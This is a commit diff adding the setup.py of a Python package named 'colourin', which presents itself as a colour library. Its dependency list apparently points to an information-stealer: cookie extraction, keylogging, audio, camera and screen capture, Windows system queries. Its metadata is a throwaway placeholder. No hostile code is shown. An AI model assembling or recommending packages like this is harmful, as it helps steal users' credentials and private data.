dc449eee09c344cdef899fa6c36286bcda3d2104
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 16:45:35 +0000

    Add package colourin/1.3.0/colourin-1.3.0.tar.gz

---
+++ packages/colourin/colourin-1.3.0.tar.gz/colourin-1.3.0/setup.py
@@ -0,0 +1,21 @@
+from setuptools import setup
+
+
+
+
+
+
+
+setup(
+    name='colourin',
+    version='1.3.0',    
+    description='Your gateway to colours in python!',
+    url='https://github.com',
+    author='Luke Joseph',
+    author_email='lol@gmail.com',
+    license='BSD 2-clause',
+    packages=['colourin'],
+    install_requires=["requests","cryptography","consolecmds","wmi","pathlib","opencv-python","screeninfo","psutil","httpx","flask","pynput","pillow","browser_cookie3","pyaudio","bleach","pypiwin32","pycryptodome","pygame"],
+
+
+)
